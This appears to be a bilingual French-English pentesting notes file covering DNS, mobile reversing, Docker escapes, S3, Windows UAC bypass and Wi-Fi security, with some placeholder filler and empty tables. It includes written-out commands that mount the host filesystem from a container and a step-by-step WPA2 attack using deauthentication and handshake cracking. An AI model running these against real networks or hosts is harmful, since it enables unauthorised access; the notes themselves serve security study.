+-------------------------------------------+--------------------------+
|                                           |                          |
+-------------------------------------------+--------------------------+
|                                           |                          |
+-------------------------------------------+--------------------------+

**The introspection query should only be allowed internally and should
not be allowed to the general public.**

-   ## MISC

```{=html}
<!-- -->
```
-   **Try SQLi from GraphQL request.**

# Bash

-   ## MISC

![](media/image404.png){width="4.364583333333333in"
height="0.7083333333333334in"}

-   **Actually, when looking for vulnerabilities in shell code, the
    > first thing to do is look for unquoted variables. It\'s easy to
    > spot, often a good candidate, generally easy to track back to
    > attacker-controlled data. There\'s an infinite number of ways an
    > unquoted variable can turn into a vulnerability.**

![](media/image403.png){width="5.46875in" height="2.5833333333333335in"}

# Ruby-On-Rails

-   ## MISC

![](media/image91.png){width="4.536458880139983in"
height="2.3835629921259844in"}

![](media/image177.png){width="4.588657042869642in"
height="2.401042213473316in"}

![](media/image328.png){width="4.640625546806649in"
height="2.5515726159230097in"}

-   Bad regular expression :

> ![](media/image116.png){width="5.889763779527559in"
> height="3.9305555555555554in"}
>
> In this code, we can inject CRLF characters to inject commands. We
> have to replace this characters :
>
> ![](media/image187.png){width="1.7083333333333333in"
> height="1.0208333333333333in"}

-   

# PowerShell

-   ## Definition

**PowerShell, ou Windows PowerShell, anciennement Microsoft Command
Shell (MSH), est une suite logicielle développée par Microsoft qui
intègre une interface en ligne de commande, un langage de script nommé
PowerShell ainsi qu'un kit de développement.**

**PowerShell est un langage de script fondé sur la programmation
orientée objet.**

# Others

![](media/image67.png){width="6.267716535433071in"
height="4.597222222222222in"}

![](media/image142.png){width="6.267716535433071in"
height="2.9583333333333335in"}

-   ## Recovering saved macOS user passwords

> **Users who have (inadvisedly) enabled automatic login often forget
> the password. It is merely encoded with an XOR cipher and stored
> in/etc/kcpassword.**
>
> **To recover this password :**

![](media/image66.png){width="6.267716535433071in"
height="2.1527777777777777in"}

-   ## Mass assignment

**L\'attribution de masse est une vulnérabilité informatique dans
laquelle un modèle d\'enregistrement actif dans une application Web est
utilisé de manière abusive pour modifier des éléments de données ( ajout
de paramètres GET ou POST oubliés ou mal gérés par exemple ).**

## Tunneling with Chisel :

![](media/image86.png){width="5.791338582677166in"
height="4.861111111111111in"}

# 

# Active Directory

**qsfsdfqfdsf**

**fqsdfqsdf**

**sqdfsqfqsdf**

# DNS

## Différents Commands

+---------------------------------------+------------------------------+
| ![](media/imag                        | -   **dig MX witrapper.com : |
| e201.png){width="4.070497594050743in" |     > retrieve MX record on  |
| height="1.6815441819772527in"}        |     > the DNS SERVER         |
|                                       |     > witrapper.com**        |
|                                       |                              |
|                                       | ```{=html}                   |
|                                       | <!-- -->                     |
|                                       | ```                          |
|                                       | -   **The second and third   |
|                                       |     > command are the        |
|                                       |     > same.**                |
|                                       |                              |
|                                       | ```{=html}                   |
|                                       | <!-- -->                     |
|                                       | ```                          |
|                                       | -   **PTR is a reverse       |
|                                       |     > lookup ( IP =\> domain |
|                                       |     > name )**               |
+=======================================+==============================+
| ![](media/image                       | -   **dig @\<nameserver\>    |
| 198.png){width="3.9559142607174103in" |     > \<domain name\> :**    |
| height="1.6144400699912511in"}        |                              |
|                                       | > **Search information about |
|                                       | > the \<domain name\> in the |
|                                       | > DNS server                 |
|                                       | > \<nameserver\>**           |
+---------------------------------------+------------------------------+
| ![](                                  | **alternative to dig.**      |
| media/image393.png){width="4.09375in" |                              |
| height="1.3333333333333333in"}        |                              |
+---------------------------------------+------------------------------+
| ![](                                  |                              |
| media/image411.png){width="4.09375in" |                              |
| height="1.9166666666666667in"}        |                              |
+---------------------------------------+------------------------------+
| **Dnsenum \<dnsServ\>**               | -   **Obtenez l\'adresse de  |
|                                       |     > l\'hôte                |
| ![](                                  |     > (enregistrement A).**  |
| media/image373.png){width="4.09375in" |                              |
| height="1.8888888888888888in"}        | -   **Obtenez les            |
|                                       |     > nameservers.**         |
|                                       |                              |
|                                       | -   **Obtenez                |
|                                       |     > l\'enregistrement MX   |
|                                       |     > (fileté).**            |
|                                       |                              |
|                                       | -   **Exécutez des requêtes  |
|                                       |     > axfr sur les serveurs  |
|                                       |     > de noms et obtenez     |
|                                       |     > BIND VERSION           |
|                                       |     > (threaded).**          |
|                                       |                              |
|                                       | -   **Obtenez des noms et    |
|                                       |     > sous-domaines          |
|                                       |     > supplémentaires via    |
|                                       |     > google scraping**      |
+---------------------------------------+------------------------------+
|                                       |                              |
+---------------------------------------+------------------------------+
|                                       |                              |
+---------------------------------------+------------------------------+
|                                       |                              |
+---------------------------------------+------------------------------+
|                                       |                              |
+---------------------------------------+------------------------------+
|                                       |                              |
+---------------------------------------+------------------------------+

![](media/image281.png){width="7.039247594050743in"
height="2.785313867016623in"}

-   ## DNSSEC

![](media/image390.png){width="6.966330927384077in"
height="3.5458125546806647in"}

-   ## MISC

```{=html}
<!-- -->
```
-   **You can check the PTR records ( Reverse add ) to find some Vhosts
    > of a site web ( multiple domaine in one server web, in one IP adr
    > )**

# Android

## Tools

+-----------------------------------+-----------------------------------+
| **apktool**                       | **Tool for reverse**              |
+===================================+===================================+
| **apktool d \[FILE.APK\]**        | **decode the apk =\> smali**      |
|                                   |                                   |
| **apktool b \[PREVIOUS OUTPUT\]** | **compile the ALL Smali folder**  |
+-----------------------------------+-----------------------------------+
| **jad ( mauvais decompiler )**    | **Java decompiler ( .class =\>    |
|                                   | .java )**                         |
+-----------------------------------+-----------------------------------+
| **d2j-dex2jar \[FILE.DEX\]**      | **.dex (Dalvik byte code, dex is  |
|                                   | files in APK) =\> .jar**          |
+-----------------------------------+-----------------------------------+
| *                                 | **Java decompiler ( .class =\>    |
| *http://www.javadecompilers.com** | .java )**                         |
+-----------------------------------+-----------------------------------+
| **jadx -d \[OUTPUT_FOLDER\]       | **Direct Java decompiler ( DEX    |
| \[APK_FILE\]**                    | =\> .JAVA )**                     |
+-----------------------------------+-----------------------------------+
| **Proguard**                      | **For Obfuscation**               |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   ## Decompile APK

> **Here 2 solutions for decompile :**

1)  **APK ( .dex ) =\> SMALI ( readable code )**

2)  **APK ( .dex ) =\> JAR -\> .class =\> java code**

**When you create an application code, the apk file contains a .dex
file, which contains binary Dalvik bytecode. This is the format that the
platform actually understands.**

**However, it\'s not easy to read or modify binary code, so there are
tools out there to convert to and from a human readable representation.
The most common human readable format is known as Smali.**

-   ## AndroidManifest.xml :

**Le fichier AndroidManifest.xml, qui se trouve à la racine de tout
projet Android, est en quelque sorte une description complète de
l'application (composantes, activités, services, permissions,
fournisseurs de contenu, etc.).**

**for more information :
[[https://developer.android.com/guide/topics/manifest/manifest-intro]{.underline}](https://developer.android.com/guide/topics/manifest/manifest-intro)**

**En informatique, un fichier JAR (Java archive) est un fichier ZIP
utilisé pour distribuer un ensemble de classes Java. Ce format est
utilisé pour stocker les définitions des classes, ainsi que des
métadonnées. On peut utiliser "unzip" dessus pour retrouver des fichier
.class.**

-   ## Root détection :

**Nowadays many applications such as financial, banking, payment wallet
applications do not work on the rooted device. Pentesting requires root
permission to install various tools to compromise the security of the
application and it is a very painful job for any pentester if the app
does not work on the rooted device that restricts the tester from
performing various test cases.**

-   ## Bypass root detection :

![](media/image188.png){width="5.889763779527559in"
height="2.7222222222222223in"}

-   ## Android Activity lifecycle :

![](media/image425.png){width="5.889763779527559in"
height="7.541666666666667in"}

-   ## Rooting and Jailbreaking : 

> **These terms refer to gaining administrator authorizations in your
> device**

-   **Here the differences between using java itself and java for
    > android :**

![](media/image16.png){width="5.889763779527559in"
height="3.986111111111111in"}

-   ## Signing mobile application :

**In general, the recommended strategy for all developers is to sign all
of your applications with the same certificate. There are several
reasons why you should do so :**

**Application upgrade -- As you release updates to your application, you
must continue to sign the updates with the same certificate or set of
certificates, if you want users to be able to upgrade seamlessly to the
new version. When the system is installing an update to an application,
it compares the certificate(s) in the new version with those in the
existing version. If the certificates match exactly, including both the
certificate data and order, then the system allows the update.**

**Application modularity -- The Android system allows applications that
are signed by the same certificate to run in the same process, if the
applications so requests, so that the system treats them as a single
application. In this way you can deploy your application in modules, and
users can update each of the modules independently if needed.**

**Code/data sharing through permissions -- The Android system provides
signature-based permissions enforcement, so that an application can
expose functionality to another application that is signed with a
specified certificate. By signing multiple applications with the same
certificate and using signature-based permissions checks, your
applications can share code and data in a secure manner.**

## MISC

-   **En faisant du debugging ( exemple avec ADB ), on peut lancer et
    > contrôler n'importe quelle Activity d'une application sur
    > Android.**

```{=html}
<!-- -->
```
-   **Unlike programming paradigms in which apps are launched with a
    > main() method, the Android system initiates code in an Activity
    > instance by invoking specific callback methods that correspond to
    > specific stages of its lifecycle.**

> **The mobile-app experience differs from its desktop counterpart in
> that a user\'s interaction with the app doesn\'t always begin in the
> same place. For instance, if you open an email app from your home
> screen, you might see a list of emails.**
>
> **By contrast, if you are using a social media app that then launches
> your email app, you might go directly to the email app\'s screen for
> composing an email.**

# IOS

## Tools

  -----------------------------------------------------------------------
  **Cycript**                         **Allows developers to explore and
                                      modify running applications on
                                      either iOS or Mac OS X**
  ----------------------------------- -----------------------------------
                                      

                                      

                                      

                                      

                                      

                                      
  -----------------------------------------------------------------------

-   ## MISC

**There are really just two languages used for iOS development. The
primary languages that dominate are Objective-C and Swift. Of course,
you can use all kinds of different languages to code iOS apps.**

**.ipa est un fichier d\'archives qui stocke une application iOS. Chaque
fichier .ipa comprend un binaire et ne peut être installé que sur un
appareil Mac OS basé sur iOS ou ARM. Les fichiers portant l\'extension
peuvent être changés par l\'extension en .zip et en les décompressant et
pour accéder plus facilement aux fichiers à l\'intérieur.**

# Reverse

-   ## Techniques d'anti-reverse :

### Polymorphisme et métamorphisme

> **Les codes malveillants se réécrivent automatiquement à chaque
> réplication pour que la signature du malware soit modifiée, on parle
> de polymorphisme.**
>
> **Le métamorphisme est une technique qui automatise un polymorphisme
> afin que chaque propagation d'un malware entraîne une réécriture
> automatique du malware.**
>
> **Elle peut par exemple prendre la forme d'une addition de NOP, de la
> permutation de registres, de l'addition d'instructions ou boucles
> inutiles, du réordonnancement des fonctions, de la modification du
> flux du programme...**

### Packer

**Les packers sont des programmes qui permettent de cacher les**

> **malwares aux antivirus, de compliquer l'analyse et de réduire la
> taille des exécutables.**
>
> **Les packers permettent notamment de rendre l'analyse statique
> inutile, à moins de réussir à les contourner.**
>
> **Le principe de fonctionnement des packers est de transformer un
> exécutable en un autre plus petit, qui va contenir l'ancien exécutable
> sous forme de données, ainsi qu'un système d'unpacking appelé par le
> système d'exploitation.**
>
> **Pour contrer un packer il est nécessaire de réaliser l'opération
> inverse à celle qui a été réalisée.**

![](media/image215.png){width="7.945497594050743in"
height="3.6775601487314087in"}

### Anti-virtualisation et anti-émulation

> **L'analyse de codes malveillants nécessite un environnement contrôlé.
> Beaucoup d'analystes vont donc choisir d'utiliser des machines
> virtuelles, présentant de plus l'avantage de pouvoir revenir
> facilement à un état enregistré. C'est pourquoi les créateurs de
> malwares ont commencé à y implémenter des éléments anti-machines
> virtuels (anti-VM) ( notamment en exploitant des informations
> divulguées par les Hyperviseurs ) .**

# Container Security

[**[https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html]{.underline}**](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

-   ## Definition

**Ce sont des environnements Linux isolés.**

**Un conteneur virtualise le système de fichier.**

**By default, containers are run as root. dockerd (the docker daemon)
runs as root, and this is normal. root is needed to configure certain
container aspects needed to function correctly. There may be ways of
running without root, but it's fine as it is.**

**Le problème majeur, souvent négligé dans l'engouement qui prévaut
aujourd'hui pour les conteneurs, est celui de la sécurité car il partage
de ressource avec l'hôte et de se fait des privilege trop élevé peut
compromettre l\'hôte.**
![](media/image331.png){width="3.9219575678040246in"
height="3.128752187226597in"}![](media/image24.png){width="5.791666666666667in"
height="2.0781255468066493in"}

##  Some Commands

+-----------------------------------+-----------------------------------+
| **docker image ls**               | **check for containers enabled in |
|                                   | the machine**                     |
+===================================+===================================+
| **docker run -v /root/:/mnt -t    | **Mount a container with the      |
| \[DOCK_IMAGE\]**                  | DOCK_IMAGE and it will make the   |
|                                   | root files accessible inside the  |
|                                   | /mnt.**                           |
+-----------------------------------+-----------------------------------+
| **docker version**                | **print docker version**          |
+-----------------------------------+-----------------------------------+
| **docker host**                   | **Check host Information**        |
+-----------------------------------+-----------------------------------+
| **docker pull**                   | **Pull an image or a repository   |
|                                   | from a registry**                 |
+-----------------------------------+-----------------------------------+
| **docker run -dt \[IMAGE\]**      | **Run image in background mode**  |
+-----------------------------------+-----------------------------------+
| **docker run -it \[IMAGE\]**      | **Run image in interactive mode** |
+-----------------------------------+-----------------------------------+
| **docker ps**                     | **List running containers**       |
+-----------------------------------+-----------------------------------+
| **docker inspect                  | **Inspect a container**           |
| \[CONTAINER_ID\]**                |                                   |
+-----------------------------------+-----------------------------------+
| **docker container**              | **Manage containers**             |
+-----------------------------------+-----------------------------------+
| **docker image**                  | **Manage image**                  |
+-----------------------------------+-----------------------------------+
| **docker network**                | **Manage docker networks**        |
+-----------------------------------+-----------------------------------+
| **docker attack                   | **enter in Interact mode to the   |
| \[CONTAINER_ID\]**                | container**                       |
+-----------------------------------+-----------------------------------+
| **docker exec -it \[CONT_ID\]     | **Execute a command in a running  |
| /bin/sh**                         | container**                       |
+-----------------------------------+-----------------------------------+
| **docker stop \[CONT_ID\]**       | **Stop a container**              |
+-----------------------------------+-----------------------------------+
| **docker start \[CONT_ID\]**      | **Start a stopped container**     |
+-----------------------------------+-----------------------------------+
| **docker kill \[CONT_ID\]**       | **Kill a running container**      |
+-----------------------------------+-----------------------------------+
| **docker rmi -f \[IMAGE\]**       | **Remove image by name or ID**    |
+-----------------------------------+-----------------------------------+
| **docker run -it -v /:/host/      | **Start an Ubuntu container.      |
| ubuntu:18.04 bash**               | Mount root directory of host      |
|                                   | machine on /host directory of     |
|                                   | the**                             |
|                                   |                                   |
|                                   | **container**                     |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   ## Registre Docker

![](media/image387.png){width="7.153830927384077in"
height="1.1708606736657918in"}

-   ## Docker Compose

![](media/image28.png){width="5.5625in" height="1.1041666666666667in"}

-   ## Dockerfile

![](media/image248.png){width="5.791338582677166in"
height="0.7916666666666666in"}

**In the scenario where a container has an Ip address 172.17.0.2, the
host machine mostly creates an interface which acts as gateway for
Docker network. And, generally the first IP address of the range is used
for that i.e. 172.17.0.1 in this case.**

**172.17.0.1 is the IP address of the host in the Docker network.**

## Container Breakouts :

**By default, the Docker containers run with limited capabilities.
Therefore to perform a privileged operation (like updating time,
debugging process etc) the container requires additional capabilities.
And, most of the time instead of defining the specific capabilities,
people just run the container in the privileged mode which can lead to
compromise of the underlying host machine using additional capabilities
like CAP_SYS_ADMIN.**

**capsh \--print =\> Check the capabilities provided in a docker
container**

**Dangerous capabilities on container**

+----------------------------------+-----------------------------------+
| **SYS_ADMIN**                    | **leveraged by mounting the root  |
|                                  | file system ( and then read all   |
|                                  | host file system )**              |
+==================================+===================================+
| **SYS_PTRACE**                   | **Allow process debugging.**      |
|                                  |                                   |
|                                  | **Leveraged by injecting a bind   |
|                                  | shell into a host machine         |
|                                  | process. ( you can do             |
|                                  | "everything" when you debug a     |
|                                  | process ).**                      |
+----------------------------------+-----------------------------------+
| **SYS_MODULE**                   | **The container can insert/remove |
|                                  | kernel modules in/from the kernel |
|                                  | of the host machine.**            |
|                                  |                                   |
|                                  | **For example, an attacker        |
|                                  | invokes a reverse shell with the  |
|                                  | help of usermode Helper API (used |
|                                  | to create user mode processes     |
|                                  | from kernel space) :**            |
|                                  |                                   |
|                                  | -                                 |
+----------------------------------+-----------------------------------+
| **docker ps \--quiet \--all \|   | **This returns either \<no        |
| xargs docker inspect \--format   | value\> or your modified seccomp  |
| \'{{ .Id }}: SecurityOpt={{      | profile. If it returns            |
| .HostConfig.SecurityOpt }}\'**   | \[seccomp:unconfined\], the       |
|                                  | container is running without any  |
|                                  | seccomp profiles and is therefore |
|                                  | not configured in line with good  |
|                                  | security practices.**             |
+----------------------------------+-----------------------------------+
| DAC_READ_SEARCH                  | bypass file read permission       |
|                                  | checks and directory read and     |
|                                  | execute permission checks.        |
|                                  |                                   |
|                                  | Using any mounted file in a       |
|                                  | container, it\'s possible to get  |
|                                  | access on files in the host       |
|                                  | system.                           |
+----------------------------------+-----------------------------------+
| DAC_OVERRIDE                     | allows a container to bypass file |
|                                  | read, write, and execute          |
|                                  | permission checks.                |
|                                  |                                   |
|                                  | Combined with DAC_READ_SEARCH     |
|                                  | capability, it can be exploited   |
|                                  | to escape a container using a     |
|                                  | famous exploit named Shocker.     |
+----------------------------------+-----------------------------------+

-   ## Misc

**- To enable services running inside the container to communicate with
Docker daemon, it\'s a very common practice to mount the Docker UNIX
socket inside the container. However, every time you have access to the
Docker Socket (default location: /var/run/docker.sock) it means that you
are root on the host.**

**Docker CLI uses two main channels to communicate with the Docker
daemon ( server ): - UNIX socket for local management
(/var/run/docker.sock)**

**- TCP/SSL for remote management. AS soon as the daemon is running by
the root**

![](media/image346.png){width="3.7684142607174103in"
height="2.6005172790901137in"}

**Namespaces provide the first and most straightforward form of
isolation: processes running within a container cannot see, and even
less affect, processes running in another container, or in the host
system.**

**There are multiple administrative tools available today which helps
developers and operation teams in managing Docker hosts/swarms. Such
tools require high privileges to perform various operations (e.g.
starting a container with special capabilities, attaching to any
container etc.). However, if they are not protected well, they can lead
to compromise the entire system.**

**La plupart des capability nécessitent d'avoir un accès root sur le
conteneur pour être exploité. Ceci ajoute une étape supplémentaire à
l'attaquant.**

**Conventionally Docker daemon is configured to listen on port 2375 for
API requests sent over unencrypted connections. Whereas 2376 is used for
encrypted connections.**

**Seccomp is essentially a mechanism to restrict system calls that a
process may make, so the same way one might block packets coming from
some IPs, one can also block processes from sending system calls to the
CPU. When you run a container, it uses the default profile seccomp
unless you override it with the \--security-opt options.**

**A single manifest is information about an image, such as layers, size,
and digest. The docker manifest command also gives users additional
information such as the os and architecture an image was built for.**

**Basically, a layer, or image layer is a change on an image, or an
intermediate image. Every command you specify (FROM, RUN, COPY, etc.) in
your Dockerfile causes the previous image to change, thus creating a new
layer.**

# S3 (Simple Storage Service) AWS (Amazon Web Services)

-   ## Définition

**The Amazon Web Services (AWS) Simple Storage Service (S3) is a common
cloud-based storage service frequently used by developers.**

-   ## S3 Buckets

**S3 buckets : AWS\'s name of choice for the storage vessel ( "cuve de
stockage" ).**

**S3 vulnerability can occur due to misconfiguration, leading to
disclosure of sensitive information.**

**Buckets and objects are S3 resources. By default, only the resource
owner can access these resources. The resource owner refers to the AWS
account that creates the resource. Access policy ( Bucket policies,
ACLs, ...) describes who has access to what.**

**Accordingly, you can categorize the available S3 access policies as
Resource-based policies or User Policies.**

-   ## ACL ( Access control list )

**ACLs are used to grant basic read/write permissions to other AWS
accounts. Each bucket and object has an ACL associated with it.**

![](media/image232.png){width="8.03350612423447in"
height="2.203882327209099in"}

**S3 supports a set of predefined grants, known as canned ACLs**

![](media/image293.png){width="8.22100612423447in"
height="3.797668416447944in"}

![](media/image282.png){width="6.450172790901138in"
height="1.362843394575678in"}

![](media/image29.png){width="7.999192913385826in"
height="1.0052088801399826in"}

![](media/image160.png){width="8.09600612423447in"
height="0.5770909886264217in"}

# Smart Contract

**gggggggggggggg**

**gfgdfgdfgdfgdfg**

# Windows in general

## Commands

  ------------------------------- ---------------------------------------
                                  

                                  

                                  

                                  
  ------------------------------- ---------------------------------------

-   ## NT hash

> **Windows NT hashes passwords before storing them in the SAM database.
> \... Each unique password produces an unpredictable hash. When a user
> logs on and enters a password, NT hashes the candidate password and
> compares it to the user\'s official hash in the SAM. If the hashes
> match, NT authenticates the user.**

-   ## Hiberfill.sys file

> **Sur Windows, il y a plusieurs moyens d'économiser de l'énergie avec
> votre PC. Vous pouvez tout simplement l'éteindre ou bien le mettre en
> veille ou encore en veille prolongée.**
>
> **Et bien c'est justement cette veille prolongée qui va avoir besoin
> du fichier hiberfil.sys. Dans ce fichier sera recopiée la totalité de
> votre mémoire vive sur votre disque système.**
>
> **Alors oui, plus vous avez de mémoire vive, plus ce fichier sera
> volumineux.**
>
> **Ce fichier est compressé ( de différente manière selon le système ).
> Avant de l'utiliser sur Volatility, il faut le décompresser.**

-   ## DLL Hijacking definiton

**A DLL or a Dynamic Link Library is a library that contains code and
data that can be used by more than one program at the same time.**

**Much of the operating system and application functionality resides in
the DLLs. You can identify missing DLL paths used by applications, and
perform DLL Hijacking to escalate privileges.**

## DLL Hijacking techniques

  ----------------------------------- -----------------------------------
                                      

                                      

                                      

                                      
  ----------------------------------- -----------------------------------

-   ## UAC Bypass definiton

**User Account Control or UAC is a security feature of Microsoft
Windows. It enforces mandatory access control to prevent unauthorized
changes to the operating system. For a user application to make any
changes, administrator authorization is required. UAC prevents malware
and other malicious programs from compromising the operating system.**

**UAC permet de définir pour chaque programme qui est lancé un niveau de
privilèges indépendant des droits possédés par l\'utilisateur actif.**

**Un administrateur local se voit ainsi attribuer au niveau du système
deux jetons d\'accès (access tokens). Le premier est celui qui englobe
tous ses droits et ses privilèges administrateur, le second est un
dérivé du premier, dit « filtré », qui contient des privilèges
d\'utilisateur standard. Par défaut, si UAC est activé, c\'est le jeton
filtré qui est utilisé, à moins qu\'un programme signale qu\'il doit
être élevé pour fonctionner, c'est-à-dire exécuté dans un contexte
administratif ( une fenêtre s'affiche ). Si l\'utilisateur n\'est pas
administrateur, il doit en outre saisir le mot de passe d\'un
administrateur actif pour exécuter le programme.**

**Il n\'est donc plus possible qu\'un programme nécessitant des droits
administrateurs soit lancé de "manière invisible".**

## UAC bypass techniques

+-----------------------------------------------------------------------+
| **Using Fodhelper utility :**                                         |
|                                                                       |
| **When a user is requesting to open "Manage Optional Features" in     |
| Windows Settings in order to make a language change a process is      |
| created under the name fodhelper.exe.**                               |
|                                                                       |
| **This binary has the auto-elevate setting to "true" ( High integrety |
| ).**                                                                  |
|                                                                       |
| **It has been discovered that the "fodhelper" process when it starts  |
| tries to find some registry keys which don\'t exist.**                |
|                                                                       |
| ![](media/image59.png){width="5.739583333333333in"                    |
| height="1.0555555555555556in"}                                        |
|                                                                       |
| **Since these registry entries don\'t exist, a user can create this   |
| structure in the registry in order to manipulate fodhelper to execute |
| a command with higher privileges bypassing the User Account Control   |
| (UAC).**                                                              |
+=======================================================================+
| **SilentCleanup scheduled task:**                                     |
|                                                                       |
| **This task automatically runs with elevated privileges. When the     |
| task runs, it will execute the file %windir%\\system32\\cleanmgr.exe. |
| The misconfiguration is that we can control the user\'s environment   |
| variables i.e %windir% we can change it to execute a malicious        |
| executable.**                                                         |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

-   ## Process migration :

**After a successful exploitation, such as, tricking a victim to execute
a Meterpreter executable, gaining RCE an executing a generated
Meterpreter payload ,Meterpreter process has to be migrated to:**

-   **Hiding the process to gain persistence and avoid detection.**

-   **Change the process architecture to execute some payloads with the
    > current architecture. For example, if there is a 64-bits system
    > and our meterpreter process is 86-bits, some architecture-related
    > problems could happen if we try to execute some exploits against
    > the session gained.**

-   **Migrate to a more stable process.**

```{=html}
<!-- -->
```
-   ## Misc

```{=html}
<!-- -->
```
-   **Pour les habitués des systèmes Linux, vous utilisez certainement
    > le couple \"Shell - SSH\" pour administrer votre machine à
    > distance. Sous Windows, on trouve l\'équivalent \"PowerShell -
    > WinRM\".**

# Wifi

## Tools

  --------------------------------- -------------------------------------
                                    

                                    

                                    

                                    
  --------------------------------- -------------------------------------

-   ## SSID

```{=html}
<!-- -->
```
-   **Le SSID (Service Set IDentifier) est tout simplement le nom d'un
    réseau WiFi, composé au maximum de 32 caractères alphanumériques. Il
    permet donc d'identifier le réseau ou le hotspot WiFi sur lequel
    vous pouvez vous connecter. Attention, le SSID doit toujours être
    accompagné d'autres mesures de sécurité, comme un protocole de
    chiffrement WPA, pour assurer une protection correcte des
    internautes surfant sur le réseau. Sinon on appelle ça un Open SSID
    ( sans mot de passe ).**

```{=html}
<!-- -->
```
-   ## WLAN

```{=html}
<!-- -->
```
-   **L\'acronyme WLAN, pour Wireless Local Area Network, désigne un
    type de réseau local qui a la particularité d\'être sans fil (
    environ une centaine de mètres )**

```{=html}
<!-- -->
```
-   ## WPA PSK

![](media/image53.png){width="7.4602755905511815in"
height="2.1093755468066493in"}

-   ## WPA ou WPA2

![](media/image300.png){width="8.200172790901137in"
height="3.878775153105862in"}

-   ## WPA-Personal vs WPA-Entreprise

![](media/image118.png){width="4.21875in" height="4.385416666666667in"}

**CCMP = Il s'agit du sigle pour CBC-MAC** Counter Mode **Protocol.**

-   Confidentialité : utilisation d'une variante de CTR mode : On
    > utilise juste un compteur initialisé dès le début, non concaténé
    > avec une nonce.

-   CBC-MAC =\> pour l'authentification

```{=html}
<!-- -->
```
-   ## WPA/WPA2 MGT

![](media/image380.png){width="6.95591426071741in"
height="1.8029899387576553in"}

![](media/image309.png){width="6.935080927384077in"
height="0.4864534120734908in"}

-   ## Protocole WPS

**- Le but du protocole WPS est de simplifier la phase de configuration
de la sécurité des réseaux sans fil. Il permet à des particuliers ayant
peu de connaissances sur la sécurité de configurer un accès WPA,
supporté par les appareils Wi-Fi.**

-   ## AP ( Access Point )

```{=html}
<!-- -->
```
-   **Access Point (AP) est un appareil permettant de nous relier au
    switch par ondes radio à la place de câbles :**

> ![](media/image79.png){width="4.519942038495188in"
> height="3.2239588801399823in"}

-   ## BSSID

```{=html}
<!-- -->
```
-   **BSSID : AP MAC Address**

```{=html}
<!-- -->
```
-   ## BSS

```{=html}
<!-- -->
```
-   **Un ensemble formé par le point d\'accès (AP) et les stations
    situés dans sa zone de couverture est appelé ensemble de services de
    base (BSS).**

![](media/image268.png){width="3.291748687664042in"
height="3.783193350831146in"}

**IEEE 802.11ac, appelé également Wi-Fi 5, est un standard de
transmission sans fil de la famille Wi-Fi, normalisé par l\'IEEE le 8
janvier 2014.**

**Evil twin : malicious copy of legitimate network with the same name
and similar features.**

**WPA3 (WiFi Protected Access 3) is the latest WiFi security standard
announced by WiFi Alliance in 2018. It will succeed the WPA2 standard.
Simultaneous Authentication of Equals (SAE) is a new feature in WPA3
which will replace the WPA2-PSK network. SAE has multiple new security
features like perfect forward secrecy, protection against passphrase
bruteforce and Protected Management Frames (PMF).**

**Enhanced Open is a new WiFi Alliance security standard for open public
networks. It is based on Opportunistic Wireless Encryption (OWE). OWE
provides privacy and secrecy without authentication without the need for
a commonly known secret.**

-   ## Password Cracking ( WPA/WPA2 BForcing )

Brute-forcing : majority of network devices and applications lack the
resilience to effectively detect and prevent brute-force attacks, it
comes as an effective attack.

Theory before practice :

Wi-Fi Handshake : A handshake in Wi-Fi is a mechanism by which an access
point authenticates a client to onboard it and use its services. In this
handshake, we have something called a message integrity check (MIC),
which is a combination of your Wi-Fi passphrase, nonce (random numbers),
SSID and some other keys. this handshake only occurs when a user
authenticates.

The goal is to capture this handshake (inside a .cap file), extract
juicy information and brute force against the MIC to finally obtain a
password.

Pré-requis :

-   1\) Avoir un external Wi-Fi adapter pouvant être mis en mode
    > "monitor".

### Steps :

-   1\) putting our Wi-Fi adapter in monitor mode first :

    -   airmon-ng start wlan0

```{=html}
<!-- -->
```
-   2\) Find your access point target (here, SSID=raaj is the target ) :

    -   airodump-ng wlan0mon

![](media/image245.png){width="7.033506124234471in"
height="2.8258508311461066in"}

-   3\) Capture a handshake :

    -   airodump-ng wlan0mon -c3 \--bssid 18:45:93:69:A5:19 -w pwd

        -   -c : channel

        -   -w : name to save as

> We have to force a user to reauthenticate by deauthenticating him. It
> can be done by aireplay-ng like this :

-   aireplay-ng \--deauth 0 -a 18:45:93:69:A5:19 wlan0mon

Now, you have to wait until you get a Handshake :

![](media/image375.png){width="5.889763779527559in"
height="0.5277777777777778in"}

-   4\) Bruteforcing :

    -   aircrack-ng handshake.cap -w dict.txt

> OU

-   cowpatty -r handshake.cap -f dict.txt -s raaj

> OU

-   cd /usr/share/hashcat-utils

> ./cap2hccapx.bin /root/handshake.cap /root/handshake.hccapx
>
> hashcat -m 2500 handshake.hccapx dict.txt \--show

OU

-   hcxpcapngtool \--john hash.john handshake.cap

> john \--format=wpapsk \--wordlist dict.txt hash.john
>
> john \--show hash.john

It can be quite worth to try all the methods.

# DevOps / DevOpsSec

-   ## Définition

**DevOps is a set of practices that combines software development (Dev)
and IT operations (Ops : Administration des systèmes ). It aims to
provide continuous delivery with high software quality.**

**Understanding of DevOps processes is a must for a Pentester or DevOps
professional.**

**DevSecOps refers to introducing security in different stages of the
DevOps process.**

**DevOps differs from SDLC and Agile.**

## Etape Dev et Ops : ![](media/image250.png){width="5.889763779527559in" height="3.0277777777777777in"}

![](media/image427.png){width="5.889763779527559in"
